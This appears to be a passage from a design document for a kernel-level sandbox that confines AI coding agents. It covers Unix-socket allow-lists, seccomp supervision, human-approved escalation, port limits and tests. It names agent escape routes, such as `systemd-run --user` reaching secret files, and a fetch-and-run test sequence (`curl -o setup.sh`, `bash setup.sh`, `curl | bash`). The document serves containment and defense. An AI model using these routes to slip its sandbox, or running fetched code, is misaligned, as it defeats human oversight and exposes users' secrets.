  answers. An abstract or other non-path address is connected as read, on
  the supervisor's copy (abstract names are per network namespace, so the
  box's are its own); a socket of the supervisor's namespace (inherited from
  the agent, with a route out) is `ENETUNREACH`. After every lookup through
  `/proc/<pid>` the notification is checked still pending, so a reused pid is
  never acted on.
- **No Unix datagram socket in the box.** A datagram socket sends to any
  path its `sendto`/`sendmsg` names, in memory a seccomp filter cannot read.
  The box's deny-filter refuses `socket` and `socketpair` for `AF_UNIX` with
  `SOCK_DGRAM` or `SOCK_RAW` with `EPERM`, and the box's child closes any
  inherited one (on 0..2 it becomes `/dev/null`). Stream sockets refuse an
  address on send and seqpacket sockets ignore it, so `connect` is the only
  way a box reaches a host socket. Cost: a boxed program that uses Unix
  datagrams itself (a syslog client) fails there.

Who serves it is settled per box in the forked child, before bwrap runs
(`exec_supervisor::socket_supervision`), because the kernel allows **one**
seccomp listener in a process's filter chain (a second
`SECCOMP_FILTER_FLAG_NEW_LISTENER` is `EBUSY`):

- **Own.** The child installs `seccomp_filter::box_socket_notify_filter`
  (`connect` and `bind`; x32 numbers refused) with a new listener, with
  `SECCOMP_FILTER_FLAG_WAIT_KILLABLE_RECV` where the kernel has it (≥ 5.19,
  so a connect the supervisor performed is never restarted and performed
  twice). The parent copies the listener out of the child with
  `pidfd_getfd`, and serves it on a thread while it waits for the box; each
  connect gets its own worker, since a connect to a full backlog blocks. The
  child closes its copy before exec, so the box never holds its own listener.
- **Guard.** Under the whole-agent guard the box's `NEW_LISTENER` is
  `EBUSY`. The launcher sets `MANDU_NET_GUARD_BOX_SOCKETS=1` on every guarded
  launch; the guard then traps `bind` too and, for a boxed process (one below
  `mandu-exec-box` in a network namespace other than the guard's), performs
  every non-INET connect under the same allow-list. The variable could be set
  by the agent; that gains nothing, because only a program that wraps the box
  binary in its own listener could exploit it, and such a program already
  runs outside every box.
- **ConnectDenied.** No listener could be installed (no user notification or
  `pidfd_getfd`, kernel < 5.6; an unsupported arch; a setuid-root bwrap; a
  foreign listener in the chain) and no guard serves the box: the deny-filter
  refuses every `connect` in the box with `EACCES`, and `mandu-exec-box`
  prints one line saying so when a command fails there. Fail-closed: a host
  socket is never reachable because supervision was unavailable.

The scan and the masks stay as the first layer. Cost: about 1–1.5 ms per
boxed command (the listener handoff and a thread); after that only `connect`
and `bind` trap, and boxed commands rarely connect.

**Residue.** The directory tmpfs covers searchable-but-unlistable directories
owned by others only through the world or group bit (group membership is not
looked up, so the answer errs toward hiding). The legacy `InProcess` backend
and the macOS Seatbelt path get none of this; Seatbelt's `(deny network*)`
already refuses Unix connects.

Tests: unprivileged units in `sandbox.rs` (the `/run` allow-list, the mask
and hide decisions, the render order, the variables' syntaxes, the
mount-race decision), `seccomp_filter.rs` (the notify filter traps `connect`
and `bind` only; the deny-filter refuses Unix datagram and raw sockets and,
in the fail-closed posture, every `connect`), `box_sockets.rs` and
`host_sockets.rs`. Kernel tests: `bubblewrap_backend_masks_host_unix_sockets`
(a stand-in `/run`: every stand-in socket reachable with the hiding off, none
with it on; the production leg proves the host's `/run/docker.sock` gone
where the host has one), `bubblewrap_backend_connects_only_to_sockets_the_box_bound`
(the allow-list alone: host sockets refused and never see a connection, the
box's own sockets connect, no Unix datagram socket can be made, and a symlink
flipped between the box's socket and the host's never reaches the host, with
a control leg so neither side is vacuous),
`a_box_under_another_listener_fails_closed_unless_the_guard_serves_it`, the
guard's `guard_serves_the_command_box_socket_allowlist`, and
`exec-box-live.test.sh` §3e (the real binaries: the box alone, under the
guard, and under a guard not serving boxes). The environment the hiding reads
is pinned in `SupervisorConfig::host_env` so concurrent tests' stand-ins do
not leak into each other's boxes.

### 4.3 The whole agent's Unix sockets (2026-09-28)

§4.2 closes host sockets for BOXED commands. The whole agent was left with
every host socket its user can reach, and a sandbox security review
(2026-09-28) showed what that costs: `systemd-run --user` from inside the
agent starts a unit in the host's namespaces, outside the twin wrap and the
guard, and that unit reads the real secret files. The D-Bus session bus,
docker, a tmux or editor server give the same.

**Decision: an allow-list, default deny, when the confidentiality axis is
on** (`secrets`, `full`). In `injection` mode the whole agent already reads
files raw and its output still goes through the proxy, so the list would cost
utility without protecting the invariant.

The launcher (`launcher/src/unix-policy.ts`) writes `unixPolicy` into the
guard's policy file; the guard (`guard_kernel.rs` `supervised_unix_connect`,
`supervised_abstract_connect`) then supervises EVERY Unix connect of the tree
and allows it when:

1. the socket is on the list, by its resolved path or its identity: the
   arbiter's socket, the session's run directory, name service (nscd, sssd,
   systemd-resolved and userdb, avahi), logging (the journal, `/dev/log`),
   and the user's choices: the ssh-agent (`$SSH_AUTH_SOCK`), the gpg-agent
   (not `S.dirmngr`, which fetches from the network outside the guard), the
   Wayland display and the X11 display (`/tmp/.X11-unix`, and the abstract
   `@/tmp/.X11-unix/X*`); plus the human's extras, policy.yaml
   `unix_sockets.allow` (read from the arbiter at launch,
   `arbiter/policy/guard-settings.ts`) unioned with `MANDU_UNIX_ALLOW`
   (colon-separated). An extra is a socket file or a directory of sockets
   (absolute or `~/`), or `@name` for an abstract socket (a trailing `*`
   makes it a prefix); `/`, `~`, `@` and `@*` are refused (they name every
   socket; `MANDU_UNIX_POLICY=0` is the switch for that). Adding an entry to
   policy.yaml RELAXES the law, so a disk edit that adds one waits for a
   human in the Inbox, and no model-facing edit op can propose one; or
2. its listener is the agent tree's own (`net-supervisor/src/unix_owner.rs`).

   **By the bind record, without a connection (2026-10-18).** The filter
   traps `bind` under every secret policy (so wherever the list is in
   force), and from before the tree runs the guard PERFORMS each Unix bind of
   the tree on a copy of the socket (`pidfd_getfd`): a socket file through
   the pinned-parent bind the write-protect list already used, an abstract
   name or an autobind with the bytes it read. Once the bind succeeded, a
   stream or seqpacket socket's cookie (`SO_COOKIE`: 64 bits, never reused)
   is recorded as one the tree named. A connect to an unlisted socket then
   looks its listener up through `sock_diag` in the guard's network
   namespace, by name and without connecting: a socket file by the device
   and inode of the file the guard pinned (`UNIX_DIAG_VFS`), an abstract
   name by its exact bytes (`UNIX_DIAG_NAME`). One listener found: reached
   if its cookie is recorded, refused if not. More than one: refused. None:
   the probe below decides, as before.

   Why at bind, not at listen. The question is whose service the agent would
   reach, and a socket's name is given once: a bind of a bound socket fails,
   so a listener the agent inherited or was handed (named by the host) is
   never recorded, and `listen()` on it again, which makes the tree its
   `listen()` caller (the kernel updates `SO_PEERCRED`, and the probe's
   creator rule below takes it for the tree's; confirmed by the kernel test),
   changes nothing. A record at listen would inherit exactly that flaw. The
   guard performs the bind rather than letting the kernel run it because only
   then does it know the bind SUCCEEDED (a CONTINUEd bind's outcome is never
   seen, and recording an attempt would record an inherited socket whose
   bind failed); it records after the bind, so a listener some other thread
   of the tree makes in that instant is refused, never the reverse. The other
   order, bound in the tree and then handed (`SCM_RIGHTS`) to a host process
   that listens and serves on it, counts as the tree's: a host program that
   takes a listening socket from the agent and serves on it is serving the
   agent by its own choice, not a host service the agent reached unbidden,
   and the agent could only hand it over through a socket it may already
   reach.

   The record is bounded: at its cap (16384 sockets) the cookies of sockets
   that no longer exist are pruned (a `sock_diag` dump of every Unix socket),
   and a bind that still finds it full is not recorded, so that listener is
   refused (fail-closed; the guard says so once). The record is kept only
   where every bind of the tree reaches the guard (`FilterTraps::traps_bind`)
   and a socket can be copied (Linux ≥ 5.6); elsewhere, and for a datagram
   socket's connect, the probe decides.

   **By the probe (the fallback).** Where the record cannot decide (a
   listener in another network namespace, which `sock_diag` does not show;
   nobody listening; no `sock_diag`; a file whose inode is over 32 bits,
   which `UNIX_DIAG_VFS` truncates; a launch without the record), the guard
   opens a probe connection of its own to the pinned socket file (or the
   abstract name) and keeps it open while it judges:
   - **the creator**, if alive, decides. `SO_PEERPIDFD` (Linux ≥ 6.5) pins
     the `listen()` caller; the guard walks its parents to the guard's child
     or the guard, and it must still be alive after the walk. In the tree:
     reached. Outside: refused, whoever else holds a copy.
   - **a holder**, once the creator is gone (or unknown before 6.5, where a
     live process outside the tree at the reported pid refuses at once).
     `sock_diag` names the listener by the probe (the listening socket whose
     queue holds the probe; once the server accepted it, the probe's peer),
     and a process of the tree must hold that socket: a descriptor whose link
     names its inode, copied (`pidfd_getfd`) and matched by the socket's
     cookie. Each candidate is pinned by a pidfd around its checks.

   The `SO_PEERCRED` pid is only a hint, never believed: the kernel keeps
   reporting the `listen()` caller's number after it exits, and a tree that
   forks until it lands on that number would otherwise own a host listener
   whose creator died. By the holder rule a server whose parent listened and
   then exited (ssh-agent's shape) is reached. The guard is the tree's child
   subreaper (`PR_SET_CHILD_SUBREAPER`), so a server the tree daemonized keeps
   it as an ancestor. Parent links cannot be forged; a cgroup check could (a
   user can move a host process into the session's scope). Not shown to be
   the tree's is refused: a non-dumpable holder whose creator exited, a
   kernel without `sock_diag` for Unix, and before 6.5 a listener in another
   network namespace whose probe is still queued.

   The probe is a real connection, queued before the tracee's: the
   listener's FIRST accept after an unlisted connect is the guard's probe,
   closed before a byte is sent, and the tracee's connection is the next
   one. A server that serves every connection (the usual shape) sees one
   empty connection more; a server that accepts exactly once and takes that
   connection for its client gets the probe (its write fails with `EPIPE`)
   and the real client waits on a connection nobody accepts. Found
   2026-10-17 by the Go probe of the sibling refusal's tests (§7.5 gap
   (d)), whose one-shot server did exactly that (it now serves every
   connection and reports `unix_accepts`). Fixed 2026-10-18 by the record
   for every listener of the guard's network namespace; it remains only
   where the probe still judges (above). A listed socket
   (`unix_sockets.allow`, `MANDU_UNIX_ALLOW`) is never probed.

An address nobody listens on (a stale socket file, a vanished abstract name:
the probe itself meets `ECONNREFUSED` or `ENOENT`) gets that errno, the
kernel's own answer, with no event, so a program that probes a stale name
before binding it sees what it would see unconfined (Claude Code probes
`$XDG_RUNTIME_DIR/cc-socks/<pid>.sock` that way, and under the wrap's pid
namespace, §7.5, the agent is always pid 2). The same holds for a socket that
is bound but not yet listening: `ECONNREFUSED`. Conversely a socket file whose
creator closed its listener is NOT stale while another process still holds a
copy: it is live, its listener is outside the tree, and it is refused.

Everything else is `EACCES`, with a `net_action` event. The connect is
performed by the guard on a copy of the tracee's socket, to the inode it
checked or the abstract address it read; a connect that cannot be supervised
is refused, never continued. An abstract connect of a socket in another
network namespace continues: that namespace's abstract names are its own.

What stops working, by design: a host tmux or screen server, D-Bus (desktop
notifications, the keyring, `xdg-open` through the portal), docker, PipeWire
and PulseAudio, CUPS, the system bus. `MANDU_UNIX_POLICY=0` turns the list off
for a launch.

**Residuals.** The list is enforced only where the guard runs: a host where
the twins are served by the bwrap wrap alone keeps the old reach. X11 lets any
client type into other windows, a host terminal included (the user's choice,
`docs/guarantees.md`). Where the probe judges (above), a listener the agent
tree holds a copy of (one its launcher leaked into it) is taken for the tree's
when its creator exited, even if a host process serves it too (the tree could
accept on it anyway), and when the tree calls `listen()` on it again (the
tree is then its `listen()` caller); under the bind record neither holds for
a listener of the guard's network namespace, which is refused unless the tree
named it.

Tests: `net-supervisor` unit (`unix_allowed`, `abstract_allowed`, `in_tree`,
the policy file) and `unix_owner` unit; kernel
`guard_allow_lists_unix_sockets_by_list_and_by_the_tree` (host listeners
refused; listed and tree-owned ones allowed; stale and not-yet-listening
sockets answered `ECONNREFUSED`; a closed listener held outside the tree
refused; each by the bind record and by the probe alone) and
`guard_judges_a_unix_listener_by_its_holder_not_a_reused_pid` (both ways);
for the bind record, `guard_serves_a_one_accept_tree_server_its_real_client`
(a socket file and an abstract name, ssh-agent's shape; red on the probe),
`guard_refuses_an_inherited_host_listener_the_tree_listens_on_again` (red on
the probe: the re-`listen()` made it the tree's) and
`guard_falls_back_to_the_probe_for_a_listener_in_another_netns`; `unix_owner`
and `guard_filter` units (the name and file attributes, the device
encoding, the lookup, the verdict, the record's cap and pruning, the bind
trap);
launcher `unix-policy.test.ts` and `guard-settings.test.ts`; arbiter
`guard-settings.test.ts`; and the integration e2e `unix-allow-list.test.ts`
(real launcher, guard and arbiter in `secrets` mode: a host listener refused,
a server the agent daemonized reachable, a one-accept server of the agent's
serving its real client on a socket file and an abstract name,
`systemd-run --user` refused inside)
and `policy-restore-and-guard-settings.test.ts`.

### 4.4 The supervisor's bounded waits (2026-10-17)

`supervise_exec` waits on two kinds of thing, and only one of them may take
as long as it takes.

**The command's own run** is the exec's runtime: the box's exit, the clean
attempt's capture drain while its command writes, the guard's answer for a
guard-hosted attempt. A build, a test suite, a server the agent started
may legitimately run for hours, so the product puts no wall-clock cap on
it, as none exists for an unsupervised exec; the agent harness's own tool
timeout is the bound (`mandu-exec-box` passes no deadline). A caller may
supply one, `SupervisorConfig::deadline: Option<Duration>` (the kernel
tests do, at their `wait_limit()`): past it the box's whole tree is
SIGKILLed (bwrap runs with `--die-with-parent`, so its pid namespace goes
with it; for the InProcess backend the supervisor walks its child's
descendants in `/proc`), the child is reaped, and the call returns
`ErrorKind::TimedOut`, never an outcome. A clean attempt that runs out
does not fall back to the ordinary box (that would run the command again
past the deadline); a guard-hosted one is refused the same way, each read
of the guard's answer bounded by what is left of the deadline.

**The supervisor's own waits** must never block for good, whatever the
caller set (`crate::deadline`):

- *The socket hand-over* (§4.2): the forked child reports its listener (or
  who serves the box) right after the fork, before anything of the command
  runs. A child still silent after `HANDOFF_LIMIT` (30 s, never past the
  caller's deadline) is stuck: a lock its fork inherited from a threaded
  process, a wedged call. Nothing else would end that wait (the child is
  alive, so its write end never closes). The child is killed and reaped and
  the exec refused with `TimedOut` naming the hand-over; it is never run
  without its socket supervision.
- *The clean attempt's drain* (§8.4): once the box child has exited, its
  capture pipes can only be held by something outside the box (the box's
  pid namespace takes its own processes with it): a fork of the supervisor
  that inherited a write end. After `DRAIN_GRACE` (2 s) of open pipes past
  the child's exit the attempt is void, discarded and falls back to the
  ordinary box, as any failed attempt does (§8.5's fallback). The pipes are
  close-on-exec (`capture_pipe`; the box child's `dup2` onto fd 1 and 2
  clears the flag on its own copies), so a process another thread of a
  threaded caller spawns while they exist drops them at its exec and holds
  them only between its fork and that exec. A plain `pipe(2)` left them in
  such a process for its whole run: past the grace that voided a clean run
  (pipeline 11899, 2026-10-18, continuous-integration.md §11), and a box
  spawned that way could write into the attempt's captured stdout. Proved
  by the kernel test `clean_box_verdict_survives_concurrent_spawns`.
- *The front-end's notification loop* (`run_supervisor`, the attach
  path): `SECCOMP_IOCTL_NOTIF_RECV` does not see its filter's end on every
  kernel. A 7.0 kernel answers ENOENT once no task uses the filter; the CI
  guest's 6.8 leaves the receive asleep for good, even one begun after the
  last tracee had exited (the loop hung there in the kernel test
  `the_notification_loop_ends_when_its_tracee_is_gone`, 2026-10-17). Each
  receive now waits for the listener to poll readable first, and a
  `POLLHUP` (no task uses the filter, kernel ≥ 5.8) ends the loop.
- *The mount race's "box is up" pipe* is non-blocking.
- *The socket server's stop* is a pipe its loop polls; connect workers are
  detached threads that end with their connect.

*The arbiter calls* (`plan_exec`, the lineage edge, the twin report, the
clean verdict's report) are bounded by the client (2026-10-17, mandu.md
§2.x): 5 s for a decision, 2 s for a report, connect included. A wedged
arbiter's `classifyExec` therefore ends in `plan_exec`'s unreachable branch,
the AgentShell box (a command a live arbiter would route to HumanShell runs
net off); a wedged `resolveExecArgv` withholds every symbol; a wedged
`escalateExec` stays AgentShell; the lineage edge and the reports are lost.
`mandu-exec-box` uses the default client, so an exec on a wedged arbiter
costs at most the classify's and the lineage edge's deadlines (kernel test
`exec_box_bin_boxes_a_humanshell_command_when_the_arbiter_hangs`).

Tests: the unit tests of `deadline.rs` (a wait and a read that give up, the
kill of a tree) and `kernel.rs`'s
`the_clean_drain_ends_when_its_pipes_outlive_the_child_or_the_deadline_passes`;
the kernel tests `a_deadline_kills_the_whole_tree_of_a_command_that_runs_past_it`
(InProcess: the shell's child is a grandchild),
`a_deadline_kills_a_bubblewrap_box_that_runs_past_it` and
`a_box_whose_socket_hand_over_never_comes_is_killed_and_refused` (a test
hook, `SupervisorConfig::before_handoff`, stands in for the stuck child;
`handoff_limit` shortens the bound).

## 5. Phase 2 — escalation + observability (implemented)

**Escalation gate.** A command that genuinely needs a restricted resource
(`needs_network` / `needs_original_fs`) may escalate AgentShell → HumanShell
ONLY behind a **human approval**. The arbiter's `escalateExec` op reuses the
interactive egress-approval queue (key `exec-escalate:<resource>` × command
signature, like the fs/network gates): a prior *approved* → HumanShell; a
*denied* → stay AgentShell; *absent/pending* → queue a PENDING entry and stay
AgentShell (fail-safe: protection is never escalated away without a human
OK). The supervisor opts in via `EscalationMode::Gated`: it classifies the
base view as AgentShell, calls `escalateExec`, and reaches HumanShell only on
approval; otherwise the command runs in AgentShell with `escalation_pending`
set (surfaced on the `exec_action` event as `needs_approval`, so the
dashboard's approval UI and `resolveEgressApproval` drive it with no new
surface). `EscalationMode::Auto` (default) keeps the direct route.

**macOS Seatbelt deny tier.** `sandbox::seatbelt_profile` renders an SBPL
profile for the AgentShell world on macOS: deny-by-default, allow reads +
exec, **deny all network**, **deny writes outside the AgentView** (allow-back
the workspace subpath + scratch). The ACCEPTED ASYMMETRY: Seatbelt cannot
remount the AgentView over the canonical path, so it does NOT substitute the
symbolized twin for reads (the command sees the real file), which is safe
because reads reach the model only via Bash-result symbolization. A command
needing more escalates to approval rather than world-swapping.

> **The asymmetry is benign for INTEGRITY only.** Under the confidentiality
> lattice a subprocess seeing real bytes *is* the threat, so `(allow file-read*)`
> becomes a hole. `confidentiality.md` §7.3 keeps this profile and adds
> `(deny file-read* (subpath …))` for catalog secret paths (SBPL is
> last-match-wins). Anyone touching `seatbelt_profile` should read that
> section first.

**Observability.** The `exec_action` event carries the shell, a
`needs_approval` usage, and the `tool_use` callId as `ExecPlan.call_id`
whenever the §4 correlation lookup (`execDecisionFor`) hit (`null` on a miss,
never consulted by the decision), so the dashboard can join a supervised exec
to its tool call; escalations ride the same egress-approval queue the
dashboard renders.

**The refusal message.** When `supervise_exec` refuses a HumanShell exec
pending approval, `ExecOutcome` carries WHY: the withheld approval items
(`withheld_approvals`) and whether the refusal is the supervisor's own
fail-closed withhold for an unreachable gate (`gate_unreachable`).
`mandu-exec-box` prints one line built by the pure
`exec_supervisor::refusal::refusal_message` (unit-tested in the default
build), in the product page's words and mirroring exec-wrap's
`plainApproval`: `mandu-exec-box: blocked, nothing ran: <why>; what to do:
<next>. detail: approval withheld (fail-closed) [<kinds>]`, exit 77. Per kind:

- `secret_symbol` (confidentiality.md §7.1): "the command line carries a
  placeholder for a secret, and Mandu never writes a secret's real value
  into a command line; what to do: a secret leaves only inside a network
  request to a site it may go to (`mandu why <file>` lists them); any other
  site asks for your OK on the dashboard's Approvals page (`mandu
  dashboard`)". Since 2026-10-05 `resolveExecArgv` leaves a secret's
  placeholder in the argv as written and the command runs (the egress proxy
  puts the value in, at a bound host only), so this kind comes back only from
  its defense-in-depth check, should a secret row ever be resolved.
- `symbol_as_command` (the frozen integrity axis; wording kept): "the command
  would use data from an untrusted source (a placeholder) as a command or
  argument, which Mandu never does; what to do: if you trust that data, run
  the command yourself, outside the agent".
- `unsupported_command`: the placeholder plus shell syntax the gate cannot
  check safely (the construct named when the reason carries it); write it as
  one plain command, or run it outside the agent.
- gate unreachable: "the Mandu service is not answering, and a checked
  command never runs unchecked" (`mandu status`), never a guessed kind. A
  dial refused with `EPERM` (a sandbox's syscall filter) or `EACCES` (an
  access rule on the socket) is not a dead service. The block is the same,
  but the message says the connection was refused and that the command
  itself was not the problem (`unreachableMessage`). Under Codex's own
  sandbox with its network off (Codex sets
  `CODEX_SANDBOX_NETWORK_DISABLED=1` in the command's environment;
  supported-agents.md §6.4) it names that sandbox, says the command could
  not have reached the network from there either, and gives both ways to
  run it: outside Codex's sandbox (`sandbox_permissions
  "require_escalated"`, which Codex asks the user about) or with the
  setting that opens the sandbox's network. Since 2026-10-05 `mandu codex`
  opens it by default unless the user's Codex config or
  `--no-codex-shell-network` keeps it off (supported-agents.md §6.5), so
  this message means one of those. Where the result is masked, the model
  learns it from the `blocked:` line instead (confidentiality plan 10
  §11.8, "Blocked commands", the `codex_sandbox` kind, 2026-10-09).

Several kinds print each reason once, joined by "Also:". The exec itself has
no approval queue (`resolveExecArgv` files none; the §5 escalation queue is
the `Gated` mode's, which the box bin does not use), so no line promises one;
the only Inbox named is the network egress gate's, a secret's actual way out.

## 6. Tests (the invariant oracle, plan §9)

- **Arbiter unit** (`arbiter/test/unit/exec-gate.test.ts`): symbol-as-command
  shapes → block; data-position symbol (incl. `grep $SYM | wc -l`) → allow;
  evasion signals surfaced but non-blocking; symbol-free command → allow.
- **Proxy unit + e2e** (anthropic + openai): a Bash `tool_use` whose command
  is symbol-as-command is rewritten to the `exit 77` sentinel on the wire and
  emits the `exec_action` (deny) event; a benign or data-position command
  passes verbatim; an arbiter error fails closed to the sentinel. The e2e
  twin (`interceptors/anthropic-proxy/test/component/exec-gate.test.ts`)
  proves this through the REAL proxy data path against a canned SSE upstream,
  with no model.
- **Live e2e** (`claude-e2e.test.ts` + catalog), driven by
  a real `claude` run and keyed on the session's `exec_action` events
  (integrity scenarios, frozen with the axis):
  - `exec-symbol-command-blocked`: the agent `cat`s a benign snippet (Bash
    output UNTRUSTED → held only as a `$MDU:*` token), then pastes that token
    into `bash -c`. `evalExecGateBlocked` asserts an `exec_action` deny, and
    an execution-evidence check on the `mandu-exec-gate: blocked` sentinel
    proves the benign failing command ran INSTEAD of the real one.
  - `benign-bash-echo` + `count-security`: `evalExecGateNotBlocked` asserts
    the gate ran and over-blocked nothing (a symbol-free command and a
    data-position multi-step workflow both pass).
  - `exec-curl-run-blindspot`: the provenance boundary of §3.3 (name kept for
    the dashboard badge's continuity). `curl -o setup.sh` then `bash
    setup.sh` carries no symbol, so the token gate allows both, and the
    provenance half refuses the run anyway: `evalExecProvenanceBlocked`
    asserts a deny by the rule `exec:tainted-program-text`, and
    `evalNotExecuted` asserts `BLINDSPOT_MARKER_42` (which only materializes
    when a real shell evaluates the snippet's `$((6*7))`) is absent from
    every ingested tool output. (The model itself refuses the literal `curl
    -s URL | bash` idiom, so the download-then-run form exercises the gap;
    the gate's verdict on the literal pipe is proven at the arbiter/proxy
    layer.)
- **The real box bin, `secrets` mode** (`launcher/test/exec-box-live.test.sh`,
  kernel tier): the shim routing, net off, the RO root, a `/tmp` project, the
  socket allow-list and the loader variables, plus §3f, a secret-bearing
  command. A file labelled `no-model` mints a `$MDU:nomodel_…` symbol: a
  boxed `bash` echoing it prints the symbol (AgentShell never desymbolizes),
  and a `curl` carrying it (HumanShell by the network-program list) runs with
  the placeholder as written, because `resolveExecArgv` never resolves a
  secret into a net-enabled argv (confidentiality.md §7.1; before 2026-10-05
  it refused the command, exit 77): the loopback sink, with no egress proxy
  in between, receives the placeholder and never the secret. The control,
  the same `curl` with an ordinary symbol, runs and delivers the value. The
  writable-AgentView leg is integrity-only and lives in the frozen lane
  (`launcher/test/integrity/exec-box-live.test.sh`).

> **Live coverage scope.** The live e2e suite exercises **Phase 0 only**, the
> model-context exec gate, which runs unprivileged. Phase 1 (the bubblewrap
> world swap) and Phase 2 (escalation + Seatbelt) are kernel-tier:
> `#[ignore]`d, `--features kernel`, run through an unprivileged userns. Their
> enforcement is proven by `interceptors/exec-supervisor/tests/kernel_integration.rs`
> (netns-off AgentShell vs. net-keeping HumanShell vs. withheld-approval
> refusal), and their decision logic by the pure unit tests (`sandbox.rs`,
> `orchestrate.rs`, the arbiter `exec-correlation` / `exec-policy` suites).

**Scripts the kernel tests execute.** A test binary's tests are threads of
one process, and many of them fork. A fork copies every descriptor, including
the write descriptor a sibling thread holds while it writes a probe script, so
exec of that script can fail `ETXTBSY` (reported as exit 126) until the child
execs or exits. Every script a kernel test execs is therefore written by
`tests/support/exec_script.rs::write_exec_script` from a forked
single-threaded child, so the test process never holds the write descriptor;
`tests/exec_script_race.rs` (default features) pins it. `exec_argv` writes
`mandu: exec failed: <errno>` to stderr before exiting 126 (the errno only,
never the argv, which in a HumanShell plan is desymbolized and reaches the
agent as tool output), and a `kernel-tests.sh` FAIL row prints every panic
with its message (`--print-panics <log>` reads a saved log).

## 7. Live boxing from the TS launcher (`--exec-box` + `--landlock-net` + `--net-guard`)

The AgentShell box (`mandu-exec-box`), the whole-agent net-confine wrap
(`mandu-landlock-apply --net-only`) and the connect guard (`mandu-net-guard`)
are kernel bins. The launcher (`launcher/src/run.ts`) wires them **ON by
default** (the non-root principle, privilege-model.md §0: every attachable
unprivileged hardening on by default where the kernel supports it), each
**probe-gated** with a **graceful degrade**: a missing bin, bwrap or kernel
feature only WARNS and proceeds WITHOUT, because they are additive hardening
layered over the always-on defense, not the defense itself. `--no-exec-box` /
`--no-landlock-net` / `--no-net-guard` (env `MANDU_EXEC_BOX=0` /
`MANDU_LANDLOCK_NET=0` / `MANDU_NET_GUARD=0`) opt out. The wrapper-tier gates
`--net-proxy` / `--exec-wrap` are default-on too, tri-state like fs-sync: the
default-on posture soft-degrades (warn + proceed) when the service cannot
start, while an EXPLICIT `--net-proxy` / `--exec-wrap` stays FAIL-CLOSED
(§7.3). The retired stubs `--fs-preload`, `--unshare` and `--unshare-net` are
parse-time errors (fs-sync and the kernel-tier FS rungs, the bwrap rungs,
landlock-net and net-guard cover those jobs). Bin resolution is shared
(`launcher/src/services/native-bins.ts`): env override (`MANDU_EXEC_BOX_BIN`
/ `MANDU_LANDLOCK_APPLY`) → the repo's
`interceptors/target/{release,debug}/<name>` → PATH → null. Build with
`scripts/build-native.sh`.

**Freshness check.** Resolution alone cannot tell a current bin from a stale
one, and a stale one is worse than none: a box bin built before a
`sandbox.rs` fix made every boxed command fail while the banner said `exec-box
LIVE`. `nativeBinStaleness` (same module) reads cargo's dep-info file beside
the artifact (`<bin>.d`, the exact source list the bin was compiled from) and
compares the newest source mtime with the bin's. Each setup logs `mandu:
WARNING — <bin> at <path> is STALE: … build with: …` and PROCEEDS: the mtime
test is a heuristic (a checkout touches files), so it names the rebuild
rather than refusing the launch (the compact launch display prints it in
full, packaging.md §5). A bin with no `.d` beside it (installed / PATH /
override copies) is never flagged. A rebuilt bin is picked up by a live
session too: the shims exec it by absolute path.

**Umbrella opt-out — `--no-kernel` (alias `--portable`, env
`MANDU_NO_KERNEL=1`, config `no-kernel`).** One switch drops EVERY
kernel-tier rung (exec-box, landlock-net incl. strict, net-guard), leaving
the userspace cooperative defense intact (context proxy, fs-sync, net-proxy,
exec-wrap, reply-filter; the §9 invariant is unaffected). It is the portable
posture for a host without bwrap/userns/Landlock, or to force userspace-only
up front. As an ENV/config default it is overridable by an explicit per-rung
flag; as a FLAG it is authoritative at its position (sequential-wins), so
`--no-kernel --exec-box` re-enables just exec-box. Proven by
`launcher-kernel-tier.test.ts` (a `--no-kernel` run in
`secrets` mode: no kernel-rung banners, no shim dir, net-proxy + exec-wrap
LIVE, and the egress gate withholds a secret symbol's exfil).

### 7.1 `--landlock-net` — whole-agent TCP port-allow wrap

`applyLandlockNet` (`launcher/src/landlock-net-setup.ts`, pure plan in
`landlock-net.ts`) PREPENDS `mandu-landlock-apply --net-only --allow-tcp-port
<p>… --skip-unsupported --` to `mut.launchPrefix`. It wraps the ENTIRE agent
tree (agent, shells, nested bwrap boxes, the stdio U-LLM child): it may
`CONNECT` only to the allowed TCP ports, and every other TCP connect is denied
in-kernel (Landlock ABI ≥ 4 / kernel ≥ 6.7). A raw-socket exfil that bypasses
`HTTP_PROXY` therefore still fails at the LSM layer. `--skip-unsupported`
degrades to a plain exec on a pre-6.7 kernel. The arbiter is a Unix socket,
so it is unaffected; the anthropic-proxy is a separate launcher daemon
OUTSIDE the wrap, so its own upstream `:443` is untouched.

**The port set** (`computeLandlockNetPorts`, unit-tested):
- always the **target's model-proxy port**: anthropic-proxy
  (`MANDU_PROXY_PORT`) for claude, openai-proxy (`MANDU_OPENAI_PROXY_PORT`)
  for codex, i.e. the port the proxy actually bound (kernel-assigned by
  default, runtime-instances.md §8). A port the launcher never adopted (0,
  the base-URL-override case) adds nothing;
- the **net-proxy port** (`MANDU_NET_PROXY_PORT`) **iff** net-proxy is live;
- the **U-LLM forwarder port** **iff** the launcher's loopback forwarder is
  live (below);
- the **workflow ports 443 AND 22** (direct TLS + git-over-ssh) UNLESS the
  user passed an explicit port list OR `--landlock-net-strict`.

**The bind allowance — `--landlock-net-bind=port,port`** (env
`MANDU_LANDLOCK_NET_BIND`, config `landlock-net-bind`; applier
`--allow-tcp-bind-port <p>`). A handled Landlock net domain denies `bind(2)`
by default, and the wrap grants CONNECT only: correct for pure clients
(claude, codex, openclaw) and fatal for an agent whose TUI is a local server
(OpenCode bound its `--port`; differential-interactive.md §13.6. Since
2026-10-11 Mandu refuses OpenCode 1's `--port` / `--hostname` / `--mdns`,
and without them 1.18.13's TUI opens no port: supported-agents.md §2.3.1
"The listen flags"). Bind rights
are granted only on ports named EXPLICITLY, never on the whole CONNECT
allow-list: a bound port is a listener any process in the tree (or, on a
non-loopback bind, any peer) could reach, so turning every allowed connect
port into a bindable one would widen the posture silently. A bind port
carries BIND|CONNECT in one rule and joins the reported CONNECT set. Pure in
`plan_net_confine(allow, bind, abi)`; proven by the kernel test
`landlock_net_confine_bind_allowance_permits_only_named_bind_ports`. The
opencode differential profile runs the rung default-on with
`MANDU_LANDLOCK_NET_BIND=<its server port>`.

**The U-LLM / 443 crux — resolved by the loopback forwarder.** The U-LLM
(`inspect-mcp`) is a stdio child of the agent, INSIDE the wrap, and in cli/api
mode dials `api.anthropic.com:443`, bypassing the net-proxy by design; a
port-only allow-list cannot pin a destination, so allowing 443 for the U-LLM
would also allow any `:443` exfil. The launcher therefore runs a **U-LLM
forwarder** (`launcher/src/services/ullm-forwarder.ts`): a VERBATIM
loopback → `api.anthropic.com` relay in the launcher process, OUTSIDE the
wrap. It is deliberately dumb (no arbiter, no symbolization, no prompt
injection, bytes through), so the quarantined-channel invariant (the U-LLM
